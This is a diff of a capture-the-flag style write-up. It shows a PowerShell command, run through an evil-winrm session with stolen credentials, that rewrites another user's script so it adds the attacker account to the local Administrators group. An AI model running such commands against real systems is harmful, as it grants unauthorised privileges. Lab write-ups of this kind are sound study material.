@@ -480,10 +480,12 @@ evil-winrm-py PS C:\Users\edavies\Documents>
 The user `jmorgan` is in the administrators group on the `acute-pc01`
 
 ```python
-evil-winrm-py PS C:\Users\edavies\Documents> Invoke-Command -ComputerName ATSSERVER -ScriptBlock {((cat C:\Use
-rs\imonks\Desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'net localgroup Administrators edavies /add') | sc -Path
- ..\desktop\wm.ps1} -Credential $cred -ConfigurationName dc_manage
+evil-winrm-py PS C:\Users\edavies\Documents> Invoke-Command -ComputerName ATSSERVER -ScriptBlock {((cat C:\Users\imonks\Desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'net localgroup Administrators edavies /add') | sc -Path C:\Users\imonks\Desktop\wm.ps1} -Credential $cred -ConfigurationName dc_manage
 ```
+
+This command will add the current user to the administrators group
+
+
 
 
 
